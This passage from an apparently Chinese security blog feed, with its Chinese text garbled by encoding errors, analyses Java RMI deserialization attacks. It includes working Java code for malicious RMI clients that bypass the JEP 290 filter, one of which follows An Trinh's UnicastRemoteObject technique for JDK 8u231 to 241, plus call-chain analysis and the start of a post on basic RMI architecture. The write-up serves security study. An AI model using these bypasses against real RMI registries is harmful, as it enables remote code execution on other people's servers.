class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">iRemoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IRemoteObjImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;RmiDemo&quot;</span>,iRemoteObj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¶æ„å®¢æˆ·ç«¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jepbypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">reg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>); <span class="comment">// rmi start at 2222</span></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2222</span>); <span class="comment">// JRMPListener&#x27;s port is 2222</span></span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(jepbypass.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        reg.bind(<span class="string">&quot;Hello&quot;</span>,proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¶æ„æ³¨å†Œç«¯</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733287787443-037c5f5f-3c13-4bc3-9bb1-e1339117823f.png"></p><p>è¿™é‡Œæ¥åˆ†ææ‰§è¡Œæµç¨‹ï¼Œå’Œä¹‹å‰ä¸€æ ·ä¹Ÿæ˜¯ä¼šèµ°åˆ°dispatchæ–¹æ³•é‡Œï¼Œä¸­é—´è¿‡ç¨‹å°±ä¸ç»†è·Ÿäº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733287890594-bc4c8fbb-cdbf-4607-9d56-f1d41d7b934d.png"></p><ol><li>åœ¨ RegistryImpl_Skel.dispatch bind åˆ†æ”¯ååºåˆ—åŒ–å‚æ•°æ—¶ï¼Œæœ€ç»ˆä¼šè¿›å…¥ RemoteObject.readObject æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚</li><li>RemoteObject.readObject æ–¹æ³•ä¸­ä¼šè°ƒç”¨ readExternal æ–¹æ³•ã€‚</li><li>è€Œ readExternal æ–¹æ³•æœ€ç»ˆè°ƒç”¨åˆ° LiveRef ç±»çš„ read æ–¹æ³•ã€‚è¿›è€Œè°ƒç”¨ saveRef å°†è¿œç¨‹å¯¹è±¡çš„ LiveRefï¼ˆæ ‡è¯†ä¿¡æ¯ã€é€šä¿¡åœ°å€ï¼‰å­˜æ”¾åœ¨ ConnectionInputStream å®ä¾‹ä¸­ã€‚</li></ol><p>è¿™é‡Œåœ¨è®°å½•ä¸‹è¿‡ç¨‹</p><p>åœ¨dispatchååºåˆ—åŒ–ä¹‹åä¼šè°ƒç”¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733306495933-d195fc0c-6e1c-4cda-8292-2c91b4d0d3b2.png"></p><p>ä¹‹åè°ƒç”¨registerRefs()è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733306521398-862bf0a8-2906-4735-a759-4dbd7fb92ced.png"></p><p>åœ¨è¿™é‡Œå°±ä¼šå‘ç°ä¼šæ ¹æ®ä¹‹å‰å­˜å‚¨çš„æ˜ å°„å…³ç³»ï¼ˆâ€åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ä¼šè¯»å‡ºåºåˆ—åŒ–æµä¸­çš„ host å’Œç«¯å£ä¿¡æ¯ï¼ˆå°±æ˜¯æ¶æ„ JRMP æœåŠ¡çš„ host ä¸ç«¯å£ï¼Œåé¢ä¼šæåˆ°ï¼‰ï¼Œç„¶åé‡æ–°å°è£…æˆä¸€ä¸ª LiveRef å¯¹è±¡ï¼Œå°†å…¶å­˜å‚¨åˆ°å½“å‰çš„ ConnectionInputStream ä¸Šã€‚ç„¶åä¼ å…¥ DGCClient#registerRefs æ–¹æ³•ä¸­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733306665162-4ce18445-7ddd-4e01-84b3-5e694198ff7f.png"></p><p>æœ€ç»ˆç”± DGCClient å‘æ¶æ„çš„ JRMP æœåŠ¡ç«¯å‘èµ· lookup è¿æ¥ï¼š</p><p>åé¢å°±æ˜¯æ¶æ„æ³¨å†Œç«¯å°†åºåˆ—åŒ–æ•°æ®ä¼ æ¥ï¼Œdgcå®¢æˆ·ç«¯è¿›è¡Œååºåˆ—åŒ–è§¦å‘ã€‚<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733306988024-667efd9d-8df9-4874-86b6-1c86fd7ab48b.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733307041945-a0ac576d-e180-46fa-83e0-b75b84ab760e.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733307029512-b708840c-a739-41f5-9452-d1d0b846994c.png"></p><p>è°ƒç”¨æ ˆæ‹¿è¿‡æ¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733306872312-1e9b050e-619f-4c8d-b36f-d245e9314d84.png"></p><h4 id="231-jdk"><a href="#231-jdk" class="headerlink" title="231 &#x3D;&lt; jdk &lt;&#x3D; 241"></a>231 &#x3D;&lt; jdk &lt;&#x3D; 241</h4><p>è¿™é‡Œä¸ºä»€ä¹ˆä¸èƒ½ç”¨äº†æ˜¯å› ä¸ºåœ¨ 8u231 ç‰ˆæœ¬åŠä»¥ä¸Šçš„ DGCImpl_Stub#dirty æ–¹æ³•ä¸­å¤šäº†ä¸€ä¸ª setObjectInputFilter çš„è¿‡ç¨‹ï¼Œåˆä¼šè¢« JEP290 check åˆ°äº† ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Lease <span class="title function_">dirty</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> (StreamRemoteCall)<span class="built_in">this</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line">        var5.setObjectInputFilter(DGCImpl_Stub::leaseFilter);</span><br></pre></td></tr></table></figure><p>An Trinh æå‡ºäº†ä¸€ç§ç»•è¿‡æ–¹å¼ï¼Œç›´æ¥é€šè¿‡ååºåˆ—åŒ– UnicastRemoteObject ç±»æ¥å‘èµ· JRMI Call è€Œä¸éœ€è¦ç»è¿‡ DGCImpl_Stub.dirty æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jepbypass2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">payload</span> <span class="operator">=</span> getPayload();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        bindReflection(<span class="string">&quot;pwn&quot;</span>, payload, registry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> UnicastRemoteObject <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2223</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        System.getProperties().put(<span class="string">&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">RMIServerSocketFactory</span> <span class="variable">factory</span> <span class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">                handler.getClass().getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Constructor&lt;UnicastRemoteObject&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">unicastRemoteObject</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field_ssf</span> <span class="operator">=</span> UnicastRemoteObject.class.getDeclaredField(<span class="string">&quot;ssf&quot;</span>);</span><br><span class="line">        field_ssf.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field_ssf.set(unicastRemoteObject, factory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> unicastRemoteObject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bindReflection</span><span class="params">(String name, Object obj, Registry registry)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ref_filed</span> <span class="operator">=</span> RemoteObject.class.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        ref_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) ref_filed.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">operations_filed</span> <span class="operator">=</span> RegistryImpl_Stub.class.getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        operations_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) operations_filed.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">remoteCall</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">0</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">outputStream</span> <span class="operator">=</span> remoteCall.getOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">enableReplace_filed</span> <span class="operator">=</span> ObjectOutputStream.class.getDeclaredField(<span class="string">&quot;enableReplace&quot;</span>);</span><br><span class="line">        enableReplace_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        enableReplace_filed.setBoolean(outputStream, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        outputStream.writeObject(name);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        ref.invoke(remoteCall);</span><br><span class="line">        ref.done(remoteCall);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æŠ„çš„åˆ«çš„å¸ˆå‚…çš„å…·ä½“ä¸ºå•¥è¿™ä¹ˆå†™å¯ä»¥è§å‚è€ƒçš„æ–‡ç« </p><p>ç„¶åæ¥è·Ÿè¸ªä¸€ä¸‹å…·ä½“è°ƒç”¨æµç¨‹</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p><p><a href="https://dummykitty.github.io/java/2023/06/26/Java-RMI-%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.html">https://dummykitty.github.io/java/2023/06/26/Java-RMI-%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.html</a></p><p><a href="https://www.anquanke.com/post/id/259059#h2-3">https://www.anquanke.com/post/id/259059#h2-3</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> JavaåŸºç¡€ </tag>
            
            <tag> RMI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMIåŸç†</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/RMI%E5%8E%9F%E7%90%86/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/RMI%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1.ç®€ä»‹"></a>1.ç®€ä»‹</h2><p>Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³Java RMIï¼ˆJava Remote Method Invocationï¼‰æ˜¯Javaç¼–ç¨‹è¯­è¨€é‡Œï¼Œä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ã€‚å®ƒä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ç‰¹æ€§ä½¿Javaç¼–ç¨‹äººå‘˜èƒ½å¤Ÿåœ¨ç½‘ç»œç¯å¢ƒä¸­åˆ†å¸ƒæ“ä½œã€‚RMIå…¨éƒ¨çš„å®—æ—¨å°±æ˜¯å°½å¯èƒ½ç®€åŒ–è¿œç¨‹æ¥å£å¯¹è±¡çš„ä½¿ç”¨ã€‚æ¥å£çš„ä¸¤ç§å¸¸è§å®ç°æ–¹å¼æ˜¯ï¼šæœ€åˆä½¿ç”¨JRMPï¼ˆJava Remote Message Protocolï¼ŒJavaè¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ï¼‰å®ç°ï¼›æ­¤å¤–è¿˜å¯ä»¥ç”¨ä¸CORBAå…¼å®¹çš„æ–¹æ³•å®ç°ã€‚RMIä¸€èˆ¬æŒ‡çš„æ˜¯ç¼–ç¨‹æ¥å£ï¼Œä¹Ÿæœ‰æ—¶å€™åŒæ—¶åŒ…æ‹¬JRMPå’ŒAPIï¼ˆåº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼‰ï¼Œè€ŒRMI-IIOPåˆ™ä¸€èˆ¬æŒ‡RMIæ¥å£æ¥ç®¡ç»å¤§éƒ¨åˆ†çš„åŠŸèƒ½ï¼Œä»¥æ”¯æŒCORBAçš„å®ç°ã€‚æœ€åˆçš„RMI APIè®¾è®¡ä¸ºé€šç”¨åœ°æ”¯æŒä¸åŒå½¢å¼çš„æ¥å£å®ç°ã€‚åæ¥ï¼ŒCORBAå¢åŠ äº†ä¼ å€¼ï¼ˆpass by valueï¼‰åŠŸèƒ½ï¼Œä»¥å®ç°RMIæ¥å£ã€‚ç„¶è€ŒRMI-IIOPå’ŒJRMPå®ç°çš„æ¥å£å¹¶ä¸å®Œå…¨ä¸€è‡´ã€‚</p><h2 id="2åŸç†ï¼š"><a href="#2åŸç†ï¼š" class="headerlink" title="2åŸç†ï¼š"></a>2åŸç†ï¼š</h2><p>æ¶æ„å›¾ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713594534904-494121f5-4244-4ca4-b11a-f34785779123.png"></p><p><code>RMI</code>åº•å±‚é€šè®¯é‡‡ç”¨äº†<code>Stub(è¿è¡Œåœ¨å®¢æˆ·ç«¯)</code>å’Œ<code>Skeleton(è¿è¡Œåœ¨æœåŠ¡ç«¯)</code>æœºåˆ¶ï¼Œ<code>RMI</code>è°ƒç”¨è¿œç¨‹æ–¹æ³•çš„å¤§è‡´å¦‚ä¸‹ï¼š</p><ol><li><code>RMIå®¢æˆ·ç«¯</code>åœ¨è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ä¼šå…ˆåˆ›å»º<code>Stub(sun.rmi.registry.RegistryImpl_Stub)</code>ã€‚</li><li><code>Stub</code>ä¼šå°†<code>Remote</code>å¯¹è±¡ä¼ é€’ç»™<code>è¿œç¨‹å¼•ç”¨å±‚(java.rmi.server.RemoteRef)</code>å¹¶åˆ›å»º<code>java.rmi.server.RemoteCall(è¿œç¨‹è°ƒç”¨)</code>å¯¹è±¡ã€‚</li><li><code>RemoteCall</code>åºåˆ—åŒ–<code>RMIæœåŠ¡åç§°</code>ã€<code>Remote</code>å¯¹è±¡ã€‚</li><li><code>RMIå®¢æˆ·ç«¯</code>çš„<code>è¿œç¨‹å¼•ç”¨å±‚</code>ä¼ è¾“<code>RemoteCall</code>åºåˆ—åŒ–åçš„è¯·æ±‚ä¿¡æ¯é€šè¿‡<code>Socket</code>è¿æ¥çš„æ–¹å¼ä¼ è¾“åˆ°<code>RMIæœåŠ¡ç«¯</code>çš„<code>è¿œç¨‹å¼•ç”¨å±‚</code>ã€‚</li><li><code>RMIæœåŠ¡ç«¯</code>çš„<code>è¿œç¨‹å¼•ç”¨å±‚(sun.rmi.server.UnicastServerRef)</code>æ”¶åˆ°è¯·æ±‚ä¼šè¯·æ±‚ä¼ é€’ç»™<code>Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)</code>ã€‚</li><li><code>Skeleton</code>è°ƒç”¨<code>RemoteCall</code>ååºåˆ—åŒ–<code>RMIå®¢æˆ·ç«¯</code>ä¼ è¿‡æ¥çš„åºåˆ—åŒ–ã€‚</li><li><code>Skeleton</code>å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼š<code>bind</code>ã€<code>list</code>ã€<code>lookup</code>ã€<code>rebind</code>ã€<code>unbind</code>ï¼Œå¦‚æœæ˜¯<code>lookup</code>åˆ™æŸ¥æ‰¾<code>RMIæœåŠ¡å</code>ç»‘å®šçš„æ¥å£å¯¹è±¡ï¼Œåºåˆ—åŒ–è¯¥å¯¹è±¡å¹¶é€šè¿‡<code>RemoteCall</code>ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚</li><li><code>RMIå®¢æˆ·ç«¯</code>ååºåˆ—åŒ–æœåŠ¡ç«¯ç»“æœï¼Œè·å–è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚</li><li><code>RMIå®¢æˆ·ç«¯</code>è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼Œ<code>RMIæœåŠ¡ç«¯</code>åå°„è°ƒç”¨<code>RMIæœåŠ¡å®ç°ç±»</code>çš„å¯¹åº”æ–¹æ³•å¹¶åºåˆ—åŒ–æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</li><li><code>RMIå®¢æˆ·ç«¯</code>ååºåˆ—åŒ–<code>RMI</code>è¿œç¨‹æ–¹æ³•è°ƒç”¨ç»“æœã€‚</li></ol><p>å‚è€ƒï¼š<a href="https://www.javasec.org/javase/RMI/">https://www.javasec.org/javase/RMI/</a></p><h2 id="3ä»£ç ç¤ºä¾‹"><a href="#3ä»£ç ç¤ºä¾‹" class="headerlink" title="3ä»£ç ç¤ºä¾‹"></a>3ä»£ç ç¤ºä¾‹</h2><p>æœåŠ¡ç«¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HOST</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">8989</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">RMI_PATH</span> <span class="operator">=</span> <span class="string">&quot;/test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RMI_NAME</span> <span class="operator">=</span> <span class="string">&quot;rmi://&quot;</span> + HOST + <span class="string">&quot;:&quot;</span> + PORT + RMI_PATH;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// æ³¨å†ŒRMIç«¯å£</span></span><br><span class="line">            LocateRegistry.createRegistry(PORT);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ›å»ºä¸€ä¸ªæœåŠ¡</span></span><br><span class="line">            <span class="type">Servicetest</span> <span class="variable">servicetest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServicetestImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æœåŠ¡å‘½åç»‘å®š</span></span><br><span class="line">            Naming.rebind(RMI_NAME, servicetest);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;å¯åŠ¨RMIæœåŠ¡åœ¨&quot;</span> + RMI_NAME);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç 